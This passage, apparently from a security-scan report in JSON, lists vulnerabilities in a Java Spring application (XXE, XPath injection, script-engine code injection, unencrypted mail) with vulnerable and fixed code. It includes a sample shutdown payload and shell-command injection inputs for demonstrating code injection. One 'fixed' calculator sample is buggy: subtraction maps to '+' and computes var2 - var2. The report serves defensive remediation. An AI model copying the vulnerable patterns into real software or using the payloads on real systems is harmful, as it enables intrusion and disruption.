{\n\t\t\tlogger.error(&quot;error in encryption&quot;, e);\n\t\t}\n\t\t\n\t\treturn encrypted;\n\t}\t\npublic ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tif(userProfile.getUserName()!=null) {\t\t\t\n\t\t\tString encrypted = encryptAES(userProfile.getPwd());\n\t        userProfile.setEncryptionKey(encrypted);\n\t        userProfile = dao.addUserProfile(userProfile);\t\t\t\t\t\t\t\t\t\t\n\t\t\t\n            UserProfileForm user = new UserProfileForm();\n\t\t\tuser.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUserProfile&quot;,&quot;userProfile&quot;,user);\n\n\t\t} else {\n\t\t\treturn new ModelAndView(&quot;addUserProfile&quot;,&quot;userProfile&quot;,new UserProfileForm());\n\t\t}\n\t}", "comments": "It is recommended to use fully qualified Cipher string as shown in non vulnerable code sample, using just AES will result in &quot;AES/ECB/PKCS5Padding&quot; depending on default service provider which is not secure. With ECB mode, same key will generate same encrypted data, with CBC mode and random iv, every encrypted data will be different.\n\nSet all security values to be explicit. It is not a good practice to leave the encryption mode implicit as the default value, (e.g.: for .Net, CBC is set as default currently, but it may change in the future).\nAs the code is using CBC to perform encryptions, the database will contain values created using CBC, and if the default in the future is another mode XYZ, the code will not be able to decrypt by using XYZ mode.\nIt is good practice to set all parameters that you want to be used explicitly on the code to avoid this future problems.", "impact": "None", "abstract": "Use of CBC mode"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "XML External Entity Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00408", "function": "javax.xml.transform.sax.SAXSource.SAXSource()", "line": "627", "snippet": "//Do unmarshall operation\n\t        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),\n\t                                        new InputSource(file.getInputStream()));\n\n\t\t\tjaxbContext = JAXBContext.newInstance(EmployeeDtlsBean.class);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00409", "function": "javax.xml.parsers.DocumentBuilder.parse()", "line": "671", "snippet": "builder = factory.newDocumentBuilder();\n            doc = builder.parse(rootPath);\n\n            XPathFactory xpathFactory = XPathFactory.newInstance();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00410", "function": "javax.xml.parsers.DocumentBuilder.parse()", "line": "978", "snippet": "try {\n            builder = factory.newDocumentBuilder();\n            doc = builder.parse(rootPath);\n            doc=(Document) doc.createTextNode(\"<EmployeeInfo><employeedtl> <empName>Jhanvi 2</empName></employeedtl></EmployeeInfo>\");"}]}], "remediation": {"remediation": {"@id": "R.0027", "@name": "XML External Entity Injection", "@dateLastModified": "1/7/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "private string ProcessXml(string filepath)\n        {\n            string sOut = &quot;&quot;;\n            //always set XmlResolver to null, this is set to null by default on .Net version 4.5+\n            <em class=\"red\">XmlDocument doc = new XmlDocument() { XmlResolver = new XmlUrlResolver() };</em>\n            doc.Load(filepath);\n            sOut = doc.InnerXml;\n            return sOut;\n        }", "nonvulncode": "private string ProcessXml(string filepath)\n        {\n            string sOut = &quot;&quot;;\n            //always set XmlResolver to null, this is set to null by default on .Net version 4.5+\n            <em class=\"blue\">XmlDocument doc = new XmlDocument() { XmlResolver = null};</em>\n            doc.Load(filepath);\n            sOut = doc.InnerXml;\n            return sOut;\n        }", "comments": "[See owasp xxe cheatsheet for reference: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html]\n\nIf possible, disable external entity DTD processing.\n\nFor .NET versions 4.5+, all xml deserializer/serializers are disabled by default and safe.\n\nTo disable external entity DTD on .NET prior to 4.5, use one of the follow:\n     1 - For XmlDocument:   Set XmlResolver to null for the XmlDocument parser.\n     2 - For XmlTextReader:  \n         2a - Set ProhibitDtd to true for XmlTextReader (Prior to version 4.0).\n         2b - Set DtdProcessing to DtdProcessing.Prohibit for XmlReader (Prior version of 4.5.2 to 4.0).\n     3 - For XPathNavigator:   User XmlReader as parser for XPathNavigator.", "impact": "If DTD processing is not required, turn it off. There is no impact on the system.\n\nIf DTD processing is required, create a custom resolver and whitelist URIs for dtd processing. See other remediation for this issue.\nhttps://stackoverflow.com/questions/32203024/how-to-configure-the-xml-parser-to-disable-external-entity-resolution-in-c-sharp\n\nSet MaxCharacterFromEntities to specific bytes expected not 0 or high value like 999999. This would prevent DOS like billion laugh attacks.\n\nSee references for mitigation: https://ourcodeworld.com/articles/read/1007/what-is-the-billion-laughs-xml-dos-attack-on-the-net-framework-c-sharp-xml-parser", "abstract": "Remove the resolver completely"}, {"@type": ".NET/C#/ASP", "vulncode": "private string ProcessXml(string filepath)\n        {\n            string sOut = &quot;&quot;;\n            //always set XmlResolver to null, this is set to null by default on .Net version 4.5+\n            <em class=\"red\">XmlDocument doc = new XmlDocument() { XmlResolver = new XmlUrlResolver() };</em>\n            doc.Load(filepath);\n            sOut = doc.InnerXml;\n            return sOut;\n        }", "nonvulncode": "private string ProcessXml(string filepath)\n        {\n            string sOut = &quot;&quot;;            \n           <em class=\"blue\"> XmlDocument doc = new XmlDocument() { XmlResolver = new CustomResolver() };\n</em>            doc.Load(filepath);\n            sOut = doc.InnerXml;\n            return sOut;\n        }\n//---------------------------------------------------------------------------\n\npublic class CustomResolver : XmlUrlResolver\n{\n\n<em class=\"blue\">   // In production, this can be a configuration file, where production team can add values as new services require new XML external entities.\n    public string[] entities = new string[]      {\n        @&quot;http://maven.apache.org/POM/4.0.0&quot;,\n        @&quot;http://maven.apache.org/maven-v4_0_0.xsd&quot;\n</em>    };\n            \n    public override object GetEntity(Uri absoluteUri, string role, Type ofObjectToReturn)\n    {\n\n        XmlDocument doc = new XmlDocument();\n        doc.Load(absoluteUri.ToString());\n        XmlNamedNodeMap nMaps = doc.DocumentType.Entities;\n            \n        <em class=\"blue\">foreach (XmlEntity nMap in nMaps)\n        {\n            if (!Array.Exists(entities, e =&gt; e.Equals(nMap.SystemId)))\n            {\n                throw new FileNotFoundException(&quot;Cannot resolve external entity.&quot;, absoluteUri.ToString());\n            }\n        }\n</em>        return base.GetEntity(absoluteUri, role, ofObjectToReturn);\n    }\n}", "comments": "If dtd processing is required, create a custom resolver and whitelist URIs for dtd processing. See reference below.\nhttps://stackoverflow.com/questions/32203024/how-to-configure-the-xml-parser-to-disable-external-entity-resolution-in-c-sharp\n\nSet MaxCharacterFromEntities to specific bytes expected not 0 or high value like 999999. This would prevent DOS like billion laugh attacks.\n\nSee references for mitigation: https://ourcodeworld.com/articles/read/1007/what-is-the-billion-laughs-xml-dos-attack-on-the-net-framework-c-sharp-xml-parser", "impact": "This is not a recommended solution unless the business requirements include dtd processing. \nExtra tests must be performed and a full research on the list of uri's to the used. \nBusiness must elaborate a list of trusted assumptions and validation checks (e.g. entity hash change) to produce alerts or to not load entities in case the entities are changed in the uri (victim of supply chain attack; DNS attacks) \n\nNOTE: Using custom resolver is not a complete security solution, and require a valid list of allowed uri.", "abstract": "whitelist URIs"}, {"@type": "JAVA/JSP", "vulncode": "EmployeeController.j<em class=\"bold\">ava</em>\n.......\ntry {\n\t\t\tString path = System.getProperty(&quot;user.dir&quot;) + &quot;\\\\EmployeeInfo.xsd&quot;;\n\t        \n\t        SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); \n\t\t\tSchema schema = factory.newSchema(new File(path)); \n<em class=\"red\">//secure properties are not set</em>\n\t\t\tValidator validator = schema.newValidator(); \t\t\n\t\t\tvalidator.validate(new StreamSource(file.getInputStream()));\n\t        \n\t\t\t\n\t        SAXParserFactory spf = SAXParserFactory.newInstance();<em class=\"red\">//features to secure xml from external entities is not set</em>\n\n\t        //Do unmarshall operation\n\t        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),\n\t                                        new InputSource(file.getInputStream()));\n\t\t\tjaxbContext = JAXBContext.newInstance(EmployeeDtlsBean.class);              \t\t\t \n\t\t    Unmarshaller jaxbUnmarshaller = jaxbContext.createUnmarshaller();\n\t\t \n\t\t    EmployeeDtlsBean employees = (EmployeeDtlsBean) jaxbUnmarshaller.unmarshal(xmlSource);\t\t    \n\t\t    List&lt;EmployeeBean&gt; employeeList = employees.getEmployeedtl();\n\t\t    \t\t    \n\t\t    employeeList.forEach(employeeBean -&gt; {employeeService.addEmployee(employeeBean);});", "nonvulncode": "EmployeeController.j<em class=\"bold\">ava\n....</em>\n\ntry {\n\t\t\tString path = System.getProperty(&quot;user.dir&quot;) + &quot;\\\\EmployeeInfo.xsd&quot;;\nSchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); \n\t\t\tSchema schema = factory.newSchema(new File(path)); \n\t\t\tValidator validator = schema.newValidator(); \n\t\t\t\t\n<em class=\"blue\">validator.setProperty(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n\t\t\tvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);\n\t\t\tvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</em>\n\t\t \n\t\t\tvalidator.validate(new StreamSource(file.getInputStream()));\n\t        \n\t        SAXParserFactory spf = SAXParserFactory.newInstance();\n\t       <em class=\"blue\"> spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);\n\t        spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);\n\t        spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</em>\n\n\t        //Do unmarshall operation\n\t        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),\n\t                                        new InputSource(file.getInputStream()));\n\n\t......\n\t\t \n\t\t    EmployeeDtlsBean employees = (EmployeeDtlsBean) jaxbUnmarshaller.unmarshal(xmlSource);\t\t    \n\t\t    List&lt;EmployeeBean&gt; employeeList = employees.getEmployeedtl();\n\t\t    \t\t    \n\t\t    employeeList.forEach(employeeBean -&gt; {employeeService.addEmployee(employeeBean);});", "comments": "A validator parser should be set with highlighted properties to avoid the xml from XXE attack.\nReference : https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\nOther information from the reference above:\n&quot;javax.xml.bind.Unmarshaller parses XML and does not support any flags for disabling XXE, it's imperative to parse the untrusted XML through a configurable secure parser first, generate a source object as a result, and pass the source object to the Unmarshaller. \nA javax.xml.xpath.XPathExpression can not be configured securely by itself, so the untrusted data must be parsed through another securable XML parser first.\nThe readObject() method in the java.beans.XMLDecoder class is fundamentally unsafe.\nThere are many third-party libraries that parse XML either directly or through their use of other libraries. Please test and verify their XML parser is secure against XXE by default. If the parser is not secure by default, look for flags supported by the parser to disable all possible external resource inclusions like the examples given above. If there's no control exposed to the outside, make sure the untrusted content is passed through a secure parser first and then passed to insecure third-party parser similar to how the Unmarshaller is secured.&quot; - OWASP", "impact": "If dtd processing is required, extra protections must be in place, including whitelist URIs (e.g.: same domain as application) and validate files (e.g., by filename) before dtd processing. \nSee JAVA section in the reference: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html", "abstract": "Use of secure property"}]}, "mitigations": {"mitigation": {"system": null, "configuration": "A/V config?", "backend": "On the backend, consider upgrading .Net to the latest version, that will protect by default against this type of vulnerability.", "frontend": null, "comments": null}}}}}, "XPath Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00411", "function": "javax.xml.xpath.XPath.evaluate()", "line": "987", "snippet": "XPathExpression expr =\n                    xpath.compile(\"/EmployeeInfo/employeedtl[@id='\" + empNum + \"']/empName/text()\");\n            node = (Node)xpath.evaluate(\"/EmployeeInfo/employeedtl[@id='\" + empNum + \"']/empName/text()\", doc, XPathConstants.NODE);\n            String  name = (String) expr.evaluate(doc, XPathConstants.STRING);\n            String namever = this.xpath.evaluate(\"Id\",doc);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00412", "function": "javax.xml.xpath.XPath.compile()", "line": "986", "snippet": "XPathExpression expr =\n                    xpath.compile(\"/EmployeeInfo/employeedtl[@id='\" + empNum + \"']/empName/text()\");\n            node = (Node)xpath.evaluate(\"/EmployeeInfo/employeedtl[@id='\" + empNum + \"']/empName/text()\", doc, XPathConstants.NODE);\n            String  name = (String) expr.evaluate(doc, XPathConstants.STRING);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00413", "function": "javax.xml.xpath.XPath.compile()", "line": "678", "snippet": "XPathExpression expr =\n                    xpath.compile(\"/EmployeeInfo/employeedtl[@id='\" + empNum + \"']/empName/text()\");\n            String  name = (String) expr.evaluate(doc, XPathConstants.STRING);\n            mv.setViewName(\"uploadFile\");"}]}], "remediation": null}, "Dynamic Code Evaluation: Code Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00428", "function": "javax.script.ScriptEngine.eval()", "line": "956", "snippet": "ScriptEngineManager manager = new ScriptEngineManager();\n\t\tScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n\t\tSystem.out.println(engine.eval(exp));\n\t\tObject result = engine.eval(exp);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00429", "function": "javax.script.ScriptEngine.eval()", "line": "957", "snippet": "ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n\t\tSystem.out.println(engine.eval(exp));\n\t\tObject result = engine.eval(exp);\n\t\t\n\t\tmv.setViewName(\"commandExec\");"}]}], "remediation": {"remediation": {"@id": "R.0032", "@name": "Dynamic Code Evaluation: Code Injection", "@dateLastModified": "2/23/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">eval.jsp\n</em>&lt;form id=&quot;evaluateForm&quot; action=&quot;eval.html&quot; method=&quot;POST&quot;&gt;\n\t&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;\n  <em class=\"red\">  &lt;input id=&quot;exp&quot; type=&quot;text&quot; name=&quot;exp&quot; /&gt;</em>\n    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Evaluate&lt;/button&gt;&lt;/p&gt;         \n&lt;/form&gt;\n<em class=\"bold\">StudentController.java</em>\npublic ModelAndView evaluate(HttpServletRequest request) throws Exception {\n\t\t<em class=\"red\">String exp = request.getParameter(&quot;exp&quot;);</em>\n\t\tModelAndView mv = new ModelAndView();\n\t\tScriptEngineManager manager = new ScriptEngineManager();\n\t\tScriptEngine engine = manager.getEngineByName(&quot;JavaScript&quot;);\n\t\t<em class=\"red\">Object result = engine.eval(exp);</em>\n\t\t\n\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\tmv.addObject(&quot;msg&quot;, &quot;Total Mark is &quot;+result);\n\t\t\n\t\treturn mv;\n\t}", "nonvulncode": "<em class=\"bold\">eval.jsp</em>\n&lt;form id=&quot;evaluateForm&quot; action=&quot;eval.html&quot; method=&quot;POST&quot;&gt;\n\t&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;\n <em class=\"blue\">   &lt;input id=&quot;subj1&quot; type=&quot;number&quot; name=&quot;subj1&quot; /&gt;\n    &lt;input id=&quot;subj2&quot; type=&quot;number&quot; name=&quot;subj2&quot; /&gt;\n</em>    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Evaluate&lt;/button&gt;&lt;/p&gt;         \n&lt;/form&gt;\n<em class=\"bold\">StudentController.java</em>\npublic ModelAndView evaluate(@RequestParam(value=&quot;subj1&quot;)<em class=\"blue\">Integer</em> subj1,@RequestParam(value=&quot;subj2&quot;)<em class=\"blue\">Integer</em> subj2) throws Exception {\n\t\t\tModelAndView mv = new ModelAndView();\n\t\t\tScriptEngineManager manager = new ScriptEngineManager();\n\t\t\tScriptEngine engine = manager.getEngineByName(&quot;JavaScript&quot;);\n\t\t\t Map&lt;String, Object&gt; marks = new HashMap&lt;String, Object&gt;();\n\t\t\t    marks.put(&quot;x&quot;, subj1);\n\t\t\t    marks.put(&quot;y&quot;, subj2);\n\t\t\t<em class=\"blue\">Object result = engine.eval(&quot;x + y&quot;, new SimpleBindings(marks));\n\t\t\t\n\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Total Mark is &quot;+result);\n\t\t\t\n\t\t\treturn mv;\n\t\t}</em>", "comments": "In the vulnerable sample, executing unvalidated user input directly would allow an attacker to execute malicious script, which can even shutdown the system. In the non vulnerable sample, we have restricted the input field to number, which will avoid code injection. Recommendation is to avoid interpreting dynamic code whenever possible. If your program must interpret code dynamically, you can minimize the likelihood of a successful attack by constraining the code that your program will execute dynamically as much as possible.\n\nIn the non vulnerable example, if x and y are not limited to Integer an attacker can manipulate the values and produce vulnerable input.\nA few example of manipulated inputs to be tested:\n   x=&quot;20 * (&quot;  and  y =&quot;2)&quot;   =&gt;   20 * (+2): manipulate values: 22 becomes 40\n   x=&quot;DIR /A *;&quot;  and   y=&quot;1&quot;). =&gt; DIR /A *; +1: Execute arpritary shell / DOS commands \n\nNote: The security scan will still detect this solution as a poor validation/code manipulation as there is no sanitization, only limiting parameters to Integer values. The application will need to add extra input sanitizations and validations based on the required functionality.\n\nReference: https://cwe.mitre.org/data/definitions/94.html", "impact": "No impact", "abstract": "Use of page level validation and restricting the input to Integer."}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">eval.jsp\n</em>&lt;form id=&quot;evaluateForm&quot; action=&quot;eval.html&quot; method=&quot;POST&quot;&gt;\n\t&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;\n  <em class=\"red\">  &lt;input id=&quot;exp&quot; type=&quot;text&quot; name=&quot;exp&quot; /&gt;</em>\n    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Evaluate&lt;/button&gt;&lt;/p&gt;         \n&lt;/form&gt;\n<em class=\"bold\">StudentController.java</em>\npublic ModelAndView evaluate(HttpServletRequest request) throws Exception {\n\t\t<em class=\"red\">String exp = request.getParameter(&quot;exp&quot;);</em>\n\t\tModelAndView mv = new ModelAndView();\n\t\tScriptEngineManager manager = new ScriptEngineManager();\n\t\tScriptEngine engine = manager.getEngineByName(&quot;JavaScript&quot;);\n\t\t<em class=\"red\">Object result = engine.eval(exp);</em>\n\t\t\n\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\tmv.addObject(&quot;msg&quot;, &quot;Total Mark is &quot;+result);\n\t\t\n\t\treturn mv;\n\t}", "nonvulncode": "<em class=\"bold\">eval.jsp</em>\n&lt;form id=&quot;evaluateForm&quot; action=&quot;eval.html&quot; method=&quot;POST&quot;&gt;\n\t&lt;input type=&quot;hidden&quot; name=&quot;${_csrf.parameterName}&quot; value=&quot;${_csrf.token}&quot; /&gt;\n <em class=\"blue\">   &lt;input id=&quot;var1&quot; type=&quot;number&quot; name=&quot;var1&quot; /&gt;\n    &lt;input id=&quot;var2&quot; type=&quot;number&quot; name=&quot;var2&quot; /&gt;\n&lt;td&gt;\n                  &lt;select path = &quot;expression&quot;&gt;\n                     &lt;option value = &quot;NONE&quot; label = &quot;Select&quot;/&gt;\n                     &lt;options items = &quot;${expressionList}&quot; /&gt;\n                  &lt;/select&gt;     \t\n               &lt;/td&gt;\n</em>    &lt;p&gt;&lt;button type=&quot;submit&quot; class=&quot;btn&quot;&gt;Evaluate&lt;/button&gt;&lt;/p&gt;         \n&lt;/form&gt;\n<em class=\"bold\">StudentController.java</em>\npublic ModelAndView evaluate(@RequestParam(value=&quot;subj1&quot;)<em class=\"blue\">Integer</em> subj1,@RequestParam(value=&quot;subj2&quot;)<em class=\"blue\">Integer</em> subj2,<em class=\"blue\">int</em> expressionID) throws Exception {\n\t\t\tModelAndView mv = new ModelAndView();\n\t\t\tScriptEngineManager manager = new ScriptEngineManager();\n\t\t\tScriptEngine engine = manager.getEngineByName(&quot;JavaScript&quot;);\n<em class=\"blue\">Map&lt;int,String&gt; expressionList = getExpression();\nString exp = expressionList.get(expressionID);\n</em>\t\t\t Map&lt;String, Object&gt; marks = new HashMap&lt;String, Object&gt;();\n\t\t\t    marks.put(&quot;x&quot;, subj1);\n\t\t\t    marks.put(&quot;y&quot;, subj2);\n\t\t\t<em class=\"blue\">Object result = engine.eval(exp, new SimpleBindings(marks));</em>\n\t\t\t\n\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Total Mark is &quot;+result);\n\t\t\t\n\t\t\treturn mv;\n\t\t}", "comments": "When the requirement is to have the expression dynamically, it can be fetched from predefined list as shown in the non vulnerable sample. Recommendation is to avoid interpreting dynamic code whenever possible (i.e., replace eval() with a method that performs the operation). \nIf the program must interpret code dynamically, minimize the likelihood of a successful attack by constraining the code the program will execute dynamically as much as possible, and always validate and sanitize the input.\n\nIn the non vulnerable example, if x and y are not limited to Integer an attacker can manipulate the values and produce vulnerable input.\nA few example of manipulated inputs that changes the addition operation in the &quot;x + y&quot; expression:\n   x=&quot;20 * (&quot;  and  y =&quot;2)&quot;   =&gt;   20 * (+2): manipulate values to perform a multiplication: 22 becomes 40\n   x=&quot;DIR /A *;&quot;  and   y=&quot;1&quot;). =&gt; DIR /A *; +1: Execute arpritary shell / DOS commands \n\nNote: The security scan will still detect this solution as a poor validation/code manipulation as there is no sanitization, only limiting parameters to Integer values. The application will need to add extra input sanitizations and validations based on the required functionality.\n\nReference: https://cwe.mitre.org/data/definitions/94.html", "impact": "Need to map the possible expression parameters and create a functional map for those (preference to use an external and protected config file for easy maintenance.\nNo impact on performance or other functionalities.", "abstract": "Use of predefined expression list"}, {"@type": ".NET/C#/ASP", "vulncode": "&lt;div&gt;\n        Input &quot;System.Diagnostics.Process.Start(&quot;shutdown&quot;,&quot;/s /t 0&quot;)&quot; as your payload to simulate the issue\n    &lt;/div&gt;\n        @Html.AntiForgeryToken()\n        &lt;h2&gt;Enter code to calculate :&lt;/h2&gt;\n        &lt;input type=&quot;text&quot; id=&quot;code&quot; name=&quot;code&quot;&gt;\n        &lt;br /&gt;&lt;br /&gt;\n        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;\n    }\n\npublic ActionResult Calculate(string code)\n        {\n\n            CSharpCodeProvider c = new CSharpCodeProvider();\n            ICodeCompiler icc = c.CreateCompiler();\n            CompilerParameters cp = new CompilerParameters();\n\n            cp.ReferencedAssemblies.Add(&quot;system.dll&quot;);\n            cp.ReferencedAssemblies.Add(&quot;system.xml.dll&quot;);\n            cp.ReferencedAssemblies.Add(&quot;system.data.dll&quot;);\n           \n\n            cp.CompilerOptions = &quot;/t:library&quot;;\n            cp.GenerateInMemory = true;\n\n            StringBuilder sb = new StringBuilder(&quot;&quot;);\n            sb.Append(&quot;using System;\\n&quot;);\n         \n            sb.Append(&quot;namespace CSCodeEvaler{ \\n&quot;);\n            sb.Append(&quot;public class CSCodeEvaler{ \\n&quot;);\n            sb.Append(&quot;public object EvalCode(){\\n&quot;);\n            sb.Append(&quot;return &quot; + <em class=\"red\">code</em> + &quot;; \\n&quot;);\n            sb.Append(&quot;} \\n&quot;);\n            sb.Append(&quot;} \\n&quot;);\n            sb.Append(&quot;}\\n&quot;);\n\n            CompilerResults cr = icc.CompileAssemblyFromSource(cp, sb.ToString());\n            if (cr.Errors.Count &gt; 0)\n            {\n                logger.Error(&quot;ERROR: &quot; + cr.Errors[0].ErrorText + &quot; Error evaluating cs code&quot;);\n                return View();\n            }\n\n            System.Reflection.Assembly a = cr.CompiledAssembly;\n            object o = a.CreateInstance(&quot;CSCodeEvaler.CSCodeEvaler&quot;);\n\n            Type t = o.GetType();\n            MethodInfo mi = t.GetMethod(&quot;EvalCode&quot;);\n\n            object s = mi.Invoke(o, null);\n            TempData[&quot;Result&quot;] = s.ToString();\n\n            return View();\n\n        }", "nonvulncode": "&lt;div&gt;\n            Input &quot;System.Diagnostics.Process.Start(&quot;shutdown&quot;,&quot;/s /t 0&quot;)&quot; as your payload to simulate the issue\n        &lt;/div&gt;\n        @Html.AntiForgeryToken()\n        &lt;h2&gt;Enter first value :&lt;/h2&gt;&lt;input type=&quot;<em class=\"blue\">number</em>&quot; id=&quot;var1&quot; name=&quot;var1&quot;&gt;\n        &lt;br /&gt;\n        &lt;h2&gt;Enter second value&lt;/h2&gt;&lt;input type=&quot;<em class=\"blue\">number</em>&quot; id=&quot;var2&quot; name=&quot;var2&quot;&gt;\n        &lt;br /&gt;\n        &lt;label for=&quot;expression&quot;&gt;Choose an expression:&lt;/label&gt;\n       <em class=\"blue\"> &lt;select name=&quot;expression&quot; id=&quot;expression&quot;&gt;\n            &lt;option value=&quot;+&quot;&gt;Addition&lt;/option&gt;\n            &lt;option value=&quot;+&quot;&gt;Subtraction&lt;/option&gt;\n            &lt;option value=&quot;*&quot;&gt;Multiplication&lt;/option&gt;\n            &lt;option value=&quot;/&quot;&gt;Division&lt;/option&gt;\n        &lt;/select&gt;</em>\n        &lt;br /&gt;&lt;br /&gt;\n        &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;\n\n  public ActionResult Calculate(int var1, int var2, string expression)\n        {\n         <em class=\"blue\">   switch(expression)</em>\n            {\n                case &quot;*&quot;:\n                    TempData[&quot;Result&quot;] = var1 * var2;\n                    break;\n                case &quot;+&quot;:\n                    TempData[&quot;Result&quot;] = var1 + var2;\n                    break;\n                case &quot;/&quot;:\n                    TempData[&quot;Result&quot;] = var1 / var2;\n                    break;\n                case &quot;-&quot;:\n                    TempData[&quot;Result&quot;] = var2 - var2;\n                    break;\n                default:\n                    logger.Error(&quot;ERROR: Invalid operator.&quot;);\n                    TempData[&quot;Result&quot;] = &quot;Invalid operator.&quot;;\n                    break;\n            }\n\n            return View();\n        }", "comments": "When the requirement is to have the expression dynamically, it can be fetched from predefined list as shown in the non vulnerable sample. Recommendation is to avoid interpreting dynamic code whenever possible.\n \nIf the program must interpret code dynamically, minimize the likelihood of a successful attack by constraining the code the program will execute dynamically as much as possible, and always validate and sanitize the input.\n\nIn the non vulnerable example, if x and y are not limited to Integer an attacker can manipulate the values and produce vulnerable input.\nA few example of manipulated inputs that changes the addition operation in the &quot;x + y&quot; expression:\n   x=&quot;20 * (&quot;  and  y =&quot;2)&quot;   =&gt;   20 * (+2): manipulate values to perform a multiplication: 22 becomes 40\n   x=&quot;DIR /A *;&quot;  and   y=&quot;1&quot;). =&gt; DIR /A *; +1: Execute arpritary shell / DOS commands (<em class=\"bold\">System.Diagnostics.Process.Start(&quot;shutdown&quot;,&quot;/s /t 0&quot;)</em>)\n\nNote: The security scan will still detect this solution as a poor validation/code manipulation as there is no sanitization, only limiting parameters to Integer values. The application will need to add extra input sanitizations and validations based on the required functionality.\n\nReference: https://cwe.mitre.org/data/definitions/94.html", "impact": "Need to map the possible expression parameters and create a functional map for those (preference to use an external and protected config file for easy maintenance.\nNo impact on performance or other functionalities.", "abstract": "Use of predefined expression list and and restricting the input to Integer."}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Insecure Transport: Mail Transmission": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00434", "function": "getDefaultInstance(properties) : Mail sent using unencrypted connection()", "line": "902", "snippet": "Properties properties = System.getProperties();\n\t\tproperties.setProperty(\"mail.smtp.host\", \"smtp.gmail.com\");\n\t\tSession session = Session.getDefaultInstance(properties);\n\t\ttry {\n\t         // Create a default MimeMessage object."}]}, {"file": "WebContent/WEB-INF/sec-spring-jpaconfig.xml", "items": [{"id": "IN00435", "function": "null()", "line": "62", "snippet": "</bean> -->\n\t\n\t   <bean id=\"mailSender\" class=\"org.springframework.mail.javamail.JavaMailSenderImpl\">\n        <property name=\"host\" value=\"smtp.gmail.com\"/>\n        <property name=\"port\" value=\"587\"/>"}]}], "remediation": {"remediation": {"@id": "R.0076", "@name": "Insecure Transport: Mail Transmission", "@dateLastModified": "3/4/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "&lt;system.net&gt;\n    &lt;settings&gt;\n      &lt;httpWebRequest useUnsafeHeaderParsing=&quot;true&quot;/&gt;\n    &lt;/settings&gt;\n    &lt;mailSettings&gt;\n      &lt;smtp from=&quot;appsec@appsec.com&quot;&gt;\n        &lt;network host=&quot;smtp.appsec.com&quot; port=&quot;35&quot; enableSsl=&quot;<em class=\"red\">false</em>&quot;/&gt;\n      &lt;/smtp&gt;\n    &lt;/mailSettings&gt;\n  &lt;/system.net&gt;", "nonvulncode": "&lt;system.net&gt;\n    &lt;settings&gt;\n      &lt;httpWebRequest useUnsafeHeaderParsing=&quot;true&quot;/&gt;\n    &lt;/settings&gt;\n    &lt;mailSettings&gt;\n      &lt;smtp 